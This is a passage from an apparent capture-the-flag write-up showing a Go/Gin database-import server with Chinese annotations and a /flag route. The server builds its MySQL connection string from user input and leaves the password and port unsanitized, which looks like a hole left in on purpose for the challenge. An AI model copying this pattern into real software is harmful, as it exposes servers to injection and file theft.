class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//作用，将用户指定的远程mysql数据库下载到当前主机然后呈现给用户  </span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;database/sql&quot;</span><br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/gin-contrib/cors&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>_ <span class="hljs-string">&quot;github.com/go-sql-driver/mysql&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> DBConfig <span class="hljs-keyword">struct</span> &#123;<br>Host     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;host&quot; binding:&quot;required&quot;`</span><br>Port     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;port&quot; binding:&quot;required&quot;`</span><br>Username <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;username&quot; binding:&quot;required&quot;`</span><br>Password <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot; binding:&quot;required&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ImportConfig <span class="hljs-keyword">struct</span> &#123;<br>RemoteHost     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_host&quot; binding:&quot;required&quot;`</span><br>RemotePort     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_port&quot; binding:&quot;required&quot;`</span><br>RemoteUsername <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_username&quot; binding:&quot;required&quot;`</span><br>RemotePassword <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_password&quot; binding:&quot;required&quot;`</span><br>RemoteDatabase <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_database&quot; binding:&quot;required&quot;`</span><br>LocalDatabase  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;local_database&quot; binding:&quot;required&quot;`</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ConnectionManager <span class="hljs-keyword">struct</span> &#123;<br>mu   sync.Mutex<br>db   *sql.DB<br>conf *DBConfig<br>&#125;<br><br><span class="hljs-keyword">var</span> manager = &amp;ConnectionManager&#123;&#125;<br><span class="hljs-keyword">var</span> localConfig DBConfig<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">loadLocalConfig</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>configFile, err := os.Open(<span class="hljs-string">&quot;config.json&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;error opening config file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> configFile.Close()<br><br>decoder := json.NewDecoder(configFile)<br><span class="hljs-keyword">if</span> err := decoder.Decode(&amp;localConfig); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;error decoding config file: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err := loadLocalConfig(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to load local configuration: %v&quot;</span>, err)<br>&#125;<br>r := gin.Default()<br><br>config := cors.DefaultConfig()<br>config.AllowAllOrigins = <span class="hljs-literal">true</span><br>config.AllowHeaders = []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Origin&quot;</span>, <span class="hljs-string">&quot;Content-Length&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>&#125;<br>r.Use(cors.New(config))<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;index.html&quot;</span>)<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;)<br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123; <span class="hljs-comment">//有路由flag，但是只返回读取flag失败</span><br>data, err := ioutil.ReadFile(<span class="hljs-string">&quot;/flag&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to read /flag file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(http.StatusOK, <span class="hljs-type">string</span>(data))<br>&#125;)<br>api := r.Group(<span class="hljs-string">&quot;/api&quot;</span>)<br>&#123;<br>api.GET(<span class="hljs-string">&quot;/databases&quot;</span>, getDatabases)<br>api.GET(<span class="hljs-string">&quot;/tables&quot;</span>, getTables)<br>api.GET(<span class="hljs-string">&quot;/data&quot;</span>, getTableData)<br>api.GET(<span class="hljs-string">&quot;/database&quot;</span>, createDatabase)<br>api.GET(<span class="hljs-string">&quot;/search&quot;</span>, searchTableData)<br>api.POST(<span class="hljs-string">&quot;/test-connection&quot;</span>, testConnection)<br>api.POST(<span class="hljs-string">&quot;/test-import-connection&quot;</span>, testImportConnection)<br>api.POST(<span class="hljs-string">&quot;/connect&quot;</span>, connect)<br>api.POST(<span class="hljs-string">&quot;/import&quot;</span>, ImportData)<br><br>&#125;<br><br>log.Printf(<span class="hljs-string">&quot;Server starting on http://localhost:9090&quot;</span>)<br>r.Run(<span class="hljs-string">&quot;:9090&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testConnection</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>dsn := buildDSN(localConfig)<br>db, err := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to open connection: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> db.Close()<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to connect: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Connection successful&quot;</span>,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testImportConnection</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> config ImportConfig<br><span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request body: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := validateImportConfig(config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid input: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>dsn := fmt.Sprintf(<span class="hljs-string">&quot;%s:%s@tcp(%s:%s)/%s&quot;</span>,  <span class="hljs-comment">//过滤函数，过滤了一些用户可控的传入数据的函数</span><br>sanitizeInput(config.RemoteUsername),  <br>config.RemotePassword,<br>sanitizeInput(config.RemoteHost),<br>config.RemotePort,<br>sanitizeInput(config.RemoteDatabase),<br>)<br><br>db, err := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to open connection: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> db.Close()<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to connect: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> dbExists <span class="hljs-type">bool</span><br>err = db.QueryRow(<span class="hljs-string">&quot;SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME = ?&quot;</span>,<br>config.RemoteDatabase).Scan(&amp;dbExists)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to verify database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> !dbExists &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Remote database does not exist&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Connection successful&quot;</span>,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">connect</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> config DBConfig<br>manager.mu.Lock()<br><span class="hljs-keyword">defer</span> manager.mu.Unlock()<br><br><span class="hljs-keyword">if</span> manager.db != <span class="hljs-literal">nil</span> &#123;<br>manager.db.Close()<br>&#125;<br>dsn := buildDSN(localConfig)<br>db, _ := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>db.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.db = db<br>manager.conf = &amp;config<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Connected To Database&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getDatabases</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>manager.mu.Lock()<br><span class="hljs-keyword">defer</span> manager.mu.Unlock()<br><br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No active connection&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>rows, err := manager.db.Query(<span class="hljs-string">&quot;SHOW DATABASES&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to fetch databases: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> databases []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> rows.Next() &#123;<br><span class="hljs-keyword">var</span> dbName <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> err := rows.Scan(&amp;dbName); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to scan database name: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> dbName != <span class="hljs-string">&quot;information_schema&quot;</span> &amp;&amp; dbName != <span class="hljs-string">&quot;mysql&quot;</span> &amp;&amp;<br>dbName != <span class="hljs-string">&quot;performance_schema&quot;</span> &amp;&amp; dbName != <span class="hljs-string">&quot;sys&quot;</span> &#123;<br>databases = <span class="hljs-built_in">append</span>(databases, dbName)<br>&#125;<br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;data&quot;</span>:    databases,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getTables</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>dbName := c.Query(<span class="hljs-string">&quot;database&quot;</span>)<br><span class="hljs-keyword">if</span> dbName == <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Database name is required&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.mu.Lock()<br><span class="hljs-keyword">defer</span> 